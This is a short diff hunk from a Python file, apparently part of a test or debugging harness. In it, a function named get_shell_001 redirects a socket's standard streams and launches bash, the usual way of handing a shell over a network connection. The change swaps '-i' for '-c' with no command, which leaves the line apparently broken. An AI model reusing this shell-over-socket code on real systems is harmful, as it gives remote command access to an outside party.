@@ -38,7 +38,7 @@ def get_shell_001():
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
-    subprocess.call(["/bin/bash","-i"])
+    subprocess.call(["/bin/bash","-c"])
 
 def teardown():
     global avatar_gdb
